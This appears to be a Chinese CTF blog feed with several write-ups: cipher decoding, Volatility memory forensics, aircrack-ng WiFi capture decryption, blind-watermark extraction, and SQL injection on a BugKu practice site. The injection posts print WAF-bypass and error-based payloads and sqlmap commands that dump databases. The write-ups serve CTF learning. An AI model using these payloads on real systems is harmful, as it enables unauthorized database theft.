        <content type="html"><![CDATA[<p>一次CTF赛后总结<br><a id="more"></a><br>总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加<strong>不让联网</strong>的CTF比赛！</p><blockquote><p>stay foolish,stay hungry</p></blockquote><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。</p><p><strong>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</strong></p><p>首先我们打开<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>，在其加密内容前加上<strong>佛曰：</strong>。如图所下：<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/1.png" alt="1.png"><br>下面是这个解出来密文，显然还有一层加密。<br><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code><br>猜测<del>base64</del>编码，结果没有解出来。联系题目猜测为rot13加密<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/2.png" alt="2.png"><br>解码出来继续base64解码，在此之后我会写相关的加密的详解。<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/3.png" alt="3.png"></p><hr><h2 id="取证内存镜像flag"><a href="#取证内存镜像flag" class="headerlink" title="取证内存镜像flag"></a>取证内存镜像flag</h2><p>这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用<del>其实就是自己懒</del>，那么这次的惨败正好弥补自己的不足。</p><p>volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f  选择所要取证的镜像文件</span><br></pre></td></tr></table></figure></p><p>进行镜像识别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imageinfo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/4.jpg" alt="4.jpg"><br>我们可以发现volatility建议我们使用<strong>WinXPSP2x86</strong>，那么继续使用查看当时的dump下来的内存中存在的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--profile  使用哪一种镜像进行取证</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pslist  查看当时dump下来所运行的进程</span><br></pre></td></tr></table></figure><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/5.jpg" alt="5.jpg"><br>然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及<code>grep</code>进行筛选。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filescan  文件扫描</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/6.png" alt="6.png"><br>那么下面我就进行导出其相关文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpfiles 导出文件</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Q   所要导出文件的地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dump-dir  导出文件所要存在那个目录里</span><br></pre></td></tr></table></figure><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/7.png" alt="7.png"><br>打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clipboard    查看剪切板的内容</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/8.png" alt="8.png"><br>于是尝试是否这个剪切板的内容就是密码，获得flag<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/9.png" alt="9.png"></p><blockquote><p>这个是<strong>真·取证</strong>，让我感觉到这个CTF还是能够提高我在安全的其他方面的。</p></blockquote><hr><h2 id="流量包解密02"><a href="#流量包解密02" class="headerlink" title="流量包解密02"></a>流量包解密02</h2><p>&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。<br>下载下来一看，文件是<code>.cap</code>结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到<strong>aircrack-ng</strong>工具解密流量。</p><p>先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量）<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/10.png" alt="10.png"></p><p>aircrack-ng解密流量，有个坑<strong>密码MAC地址大写</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-w   使用密码字典</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/11.jpg" alt="11.jpg"><br>然后将key值导入进去(<strong>首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key</strong>)<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/12.png" alt="12.png"><br>然后追踪TCP流<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/13.png" alt="13.png"><br>最后查看网址找到了flag<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/14.png" alt="14.png"></p><hr><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p><a href="https://blog.csdn.net/qq_28208251/article/details/48093575" target="_blank" rel="noopener">https://blog.csdn.net/qq_28208251/article/details/48093575</a><br><a href="https://xz.aliyun.com/t/1972" target="_blank" rel="noopener">https://xz.aliyun.com/t/1972</a><br><a href="http://netsecurity.51cto.com/art/201105/264844.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201105/264844.htm</a><br><a href="https://blog.csdn.net/dmbjzhh/article/details/79425483" target="_blank" rel="noopener">https://blog.csdn.net/dmbjzhh/article/details/79425483</a></p><blockquote><p><strong>如果有同学需要上述题目，请联系我</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 比赛wp </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>照片里的盲水印</title>
      <link href="/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
      <url>/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
      
        <content type="html"><![CDATA[<p>很典型的CTF比赛题目<br><a id="more"></a><br>这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的<del>赛事水平</del>（赛棍？？？）<br><img src="/2018/09/02/照片里的盲水印/1.jpg" height="150px" width="150px"><br>但是这个方面还是要看一下，就当做开发脑力了。</p><p><strong>题目：暴力可解</strong><br><a href="https://pan.baidu.com/s/1GI9TlX3PtytDs0g6w-s3PQ" target="_blank" rel="noopener">题目文件</a><br>下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是<strong>纯数字类型</strong>。<br><img src="/2018/09/02/照片里的盲水印/2.jpg" alt="暴力破解"><br>获得密码，解压得到两张相同的图片。<br><img src="/2018/09/02/照片里的盲水印/3.png" alt="解压所得图片"><br>在misc中，两张相同的图片基本上都应该是<strong>盲水印</strong>，所以使用bwm脚本（python2）。bwm脚本的<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">github</a><br>运行脚本发现没有cv2这个模块，使用下面的命令安装cv2<br><code>pip install opencv-python</code><br>然后运行<code>python bwm.py decode 1.png 2.png flag.png</code>。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。<br><img src="/2018/09/02/照片里的盲水印/4.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 盲水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>报错注入需要学习一下<br><a id="more"></a><br>快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。</p><p>这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。</p><p>题名：多次，<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">网址链接</a></p><p>首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤<strong>?id=1’</strong>，页面发生变化，猜测位查询语句为单引号闭合。<br><img src="/2018/08/17/SQL报错注入/1.png" alt=""><br>再次进行测试，<strong>?id=1′ or 1=1%23 </strong>，发现并无变化。<br><img src="/2018/08/17/SQL报错注入/2.png" alt=""><br>猜测可能有WAF过滤，于是测试双重写or，<strong>?id=1′ oorr 1=1%23</strong> ，测试发现页面改变<br><img src="/2018/08/17/SQL报错注入/3.png" alt=""></p><p>进行测试过滤，使用异或符号（^）搭配length函数开始测试。</p><p><em>如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。</em><br><img src="/2018/08/17/SQL报错注入/4.png" alt=""><br>经测试：or，and，union，select被过滤。那么接下来就是常规测试。</p><p><strong>?id=1%27 oorrder by 2%23</strong>，测试列数为2。（注意order里面的or）<br><img src="/2018/08/17/SQL报错注入/5.png" alt=""></p><h1 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：<strong>information里面的or</strong>）<br><img src="/2018/08/17/SQL报错注入/6.png" alt=""></p><h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23<br><img src="/2018/08/17/SQL报错注入/7.png" alt=""></p><h1 id="爆出数据"><a href="#爆出数据" class="headerlink" title="爆出数据"></a>爆出数据</h1><p>?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23<br><img src="/2018/08/17/SQL报错注入/8.png" alt=""><br>然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。</p><h1 id="寻找下一关地址"><a href="#寻找下一关地址" class="headerlink" title="寻找下一关地址"></a>寻找下一关地址</h1><p>?id=-1%27 uniounionn selecselectt 1,address from flag1 %23<br><img src="/2018/08/17/SQL报错注入/9.png" alt=""></p><h2 id="找到下一关地址"><a href="#找到下一关地址" class="headerlink" title="找到下一关地址"></a>找到下一关地址</h2><p><img src="/2018/08/17/SQL报错注入/10.png" alt=""><br>OK，还是向上面的一样测试，发现还是单引号过滤。<br><img src="/2018/08/17/SQL报错注入/11.png" alt=""><br>发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union<br><img src="/2018/08/17/SQL报错注入/12.png" alt=""><br>那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。<br><img src="/2018/08/17/SQL报错注入/13.PNG" alt=""><br>因为还发现有报错产生，那么我就进行报错盲注测试。</p><p>盲注测试公式：<strong>union select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</strong></p><p>其中<strong>version()</strong>改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。</p><p> <em>or (select 1 from(select count(</em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)<em>2))x from information_schema.schemata group by x)a)%23</em></p><p>因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错<strong>Operand should contain 1 column(s) </strong>, 且(select count(<em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)</em>2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。<br><img src="/2018/08/17/SQL报错注入/14.png" alt=""><br>但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。<br><img src="/2018/08/17/SQL报错注入/15.png" alt=""><br>解决方法：left((select flag2 from flag2),40)，取前40个字符。<br><img src="/2018/08/17/SQL报错注入/16.png" alt=""></p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p><p><a href="http://wyb0.com/" target="_blank" rel="noopener">http://wyb0.com/</a></p><blockquote><p><strong>两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLinjection </tag>
            
            <tag> 手动注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMAP-POST注入</title>
      <link href="/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>POST注入+SQLMAP<br><a id="more"></a><br>BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。</p><p><center><strong>抓包，复制出来打成一个txt文件</strong></center><br><img src="/2018/08/17/SQLMAP-POST注入/1.png" alt="抓包内容"></p><p><center><strong>sqlmap -r test.txt -p admin_name –dbs</strong></center><br>因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。<br><img src="/2018/08/17/SQLMAP-POST注入/2.png" alt=""></p><ul><li><p>-r  指定一个文件。</p></li><li><p>-p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。</p></li><li><p>–dbs 爆出所有的数据库。</p></li></ul><p>点击回车运行，竟然发现无法进行sql注入！</p><p><img src="/2018/08/17/SQLMAP-POST注入/3.png" alt=""><br>上图是我进行注入失败，后面继续追加了下面的参数</p><ul><li><p>-v  这个是展现攻击测试的详细过程的程度，一般设为3就足够。</p></li><li><p>–threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。</p></li></ul><center><strong>sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3</strong></center><p><img src="/2018/08/17/SQLMAP-POST注入/4.PNG" alt=""><br>如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。</p><p>解释参数：</p><ul><li>–level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。<br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –table</strong></center><br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump</strong></center><br>这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。</li></ul><p>解释参数：</p><ul><li><p>-D 指定数据库。</p></li><li><p>-T  指定表。</p></li><li><p>–table  数据库爆表名。</p></li><li><p>–dump 显示所有字段。</p></li></ul><hr><p><a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">题目地址</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> SQLinjection </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
